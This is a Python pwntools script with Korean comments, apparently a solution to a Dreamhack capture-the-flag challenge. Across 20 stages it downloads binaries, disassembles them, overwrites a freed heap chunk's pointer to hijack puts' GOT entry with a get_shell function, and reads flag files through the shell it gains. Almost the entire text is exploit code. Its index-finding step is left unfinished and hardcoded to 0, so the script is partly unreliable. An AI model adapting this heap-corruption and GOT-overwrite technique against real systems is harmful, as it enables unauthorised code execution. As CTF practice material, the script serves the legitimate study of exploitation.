from pwn import *
import base64
import os
import subprocess

# context 설정
context.log_level = 'debug'
context.arch = 'amd64'

# 서버 연결
# 포트는 접속할 때마다 바뀔 수 있으니 확인해주세요 (현재 로그상 13360)
p = remote("host3.dreamhack.games", 13360)

def solve_stage(stage_num):
    # 1. 바이너리 수신 및 저장
    p.recvuntil(b"BINARY(base64encoded)----------\n")
    b64_binary = p.recvuntil(b"----------")[:-10] # 뒷부분 구분자 제거
    binary = base64.b64decode(b64_binary)
    
    filename = f"./bin_{stage_num}"
    with open(filename, "wb") as f:
        f.write(binary)
    
    os.system(f"chmod +x {filename}")
    
    # ELF 분석을 위해 로드
    e = ELF(filename, checksec=False)
    
    # 2. 분석: Free되는 인덱스 찾기 (AEG 핵심)
    # objdump를 이용해 free(혹은 free wrapper) 호출 직전의 인자를 파싱합니다.
    # 문제의 패턴: free(buf[idx]) -> mov rax, [rbp-0x??]; mov rdi, rax; call free
    
    try:
        # objdump로 디스어셈블 (인텔 문법)
        # grep으로 call _free 직전 5줄을 뽑습니다.
        # 주의: 함수 이름이 _free가 아니라 plt의 free일 수 있으므로 주소나 이름을 확인해야 합니다.
        # 통상적으로 call ... <free@plt> 형태입니다.
        
        # objdump 실행
        cmd = f"objdump -d -M intel {filename} | grep -B 5 'call.*free'"
        output = subprocess.check_output(cmd, shell=True).decode()
        
        # 마지막 free 호출 부분에서 [rbp-0x??] 오프셋을 찾습니다.
        # 예: mov rax,QWORD PTR [rbp-0x858]
        # 스택 프레임 구조상 buf 배열의 시작점과 이 변수의 오프셋 차이를 이용해 인덱스를 구합니다.
        
        # 여기서는 간단히 '마지막 줄들'에서 16진수 오프셋을 추출하는 로직을 예시로 듭니다.
        # 실제 환경에서는 이 오프셋 값들이 바이너리마다 다릅니다.
        
        # (간편한 방법) 이 문제의 특성상 main+? 위치에 고정적으로 비교 구문이 나올 수 있습니다.
        # 하지만 정석대로라면 rbp-0x?? 값을 읽어야 합니다.
        
        # [중요] 아래 로직은 사용자의 환경/바이너리 패턴에 따라 수정이 필요할 수 있습니다.
        # 가장 확실한 방법은 첫 번째 바이너리(bin_0)를 받아 gdb로 열어보고,
        # 마지막 free가 일어나는 곳의 어셈블리 명령어를 확인한 뒤 그 패턴을 파이썬 정규식으로 짜는 것입니다.
        
        # 임시로 0번 인덱스로 시도 (실제 파싱 로직 구현 필요)
        target_idx = 0 
        
        # 힌트: output 변수에 담긴 문자열에서 "rbp-0x" 뒤의 숫자를 찾아보세요.
        # matches = re.findall(r'rbp-(0x[0-9a-f]+)', output)
        # if matches:
        #     last_offset = int(matches[-1], 16)
        #     # buf_start_offset은 보통 고정적이거나 다른 명령어로 찾을 수 있음
        #     # target_idx = (buf_start_offset - last_offset) // 8
        
    except Exception as ex:
        log.info(f"Analysis Failed: {ex}")
        target_idx = 0

    # 3. Exploit 수행
    puts_got = e.got['puts']
    get_shell = e.symbols['get_shell'] # 심볼 이름이 get_shell인지 확인 필요 (없으면 win 등)
    
    # 타겟 인덱스 전송
    p.sendlineafter(b"select chunk to modify(idx): ", str(target_idx).encode())
    
    # Data 입력 (Freed Chunk의 FD 덮어쓰기 -> puts_got)
    p.sendlineafter(b"input data: ", p64(puts_got))
    
    # Comment 입력 (puts_got 영역에 get_shell 주소 쓰기)
    p.sendlineafter(b"input comment : ", p64(get_shell))
    
    # 4. Flag 획득 시도
    # 쉘 명령 실행
    p.sendline(b"cat /tmp/subflag_*.txt") 
    
    try:
        # 데이터 수신 대기
        data = p.recv(timeout=1)
        if b"SUBFLAG" in data:
            log.success(f"Stage {stage_num} Cleared! Output: {data}")
        
        p.sendline(b"exit") # 쉘 종료
        # p.sendline(b"")     # 필요시 엔터 추가 전송
    except:
        log.failure("Flag extraction failed")

# 메인 실행 루프
# "Are u ready" 질문에 답변
p.sendlineafter(b"Are u ready (y/n) ? ", b"y")

for i in range(20):
    log.info(f"=== STAGE {i+1} ===")
    solve_stage(i)

p.interactive()